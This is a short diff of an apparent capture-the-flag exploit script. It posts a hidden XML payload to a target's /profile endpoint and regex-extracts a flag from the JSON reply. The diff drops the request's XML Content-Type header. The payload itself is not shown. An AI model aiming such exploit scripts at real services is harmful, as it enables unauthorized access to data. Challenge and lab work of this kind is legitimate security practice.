@@ -17,8 +17,7 @@ PAYLOAD = (
 def main():
     host, port = sys.argv[1], sys.argv[2]
     req = urllib.request.Request(f"http://{host}:{port}/profile",
-                                 data=PAYLOAD.encode(),
-                                 headers={"Content-Type": "application/xml"})
+                                 data=PAYLOAD.encode())
     data = json.loads(urllib.request.urlopen(req, timeout=15).read())
     g = data.get("greeting", "")
     m = re.search(r"flag\{[^}]*\}", g)
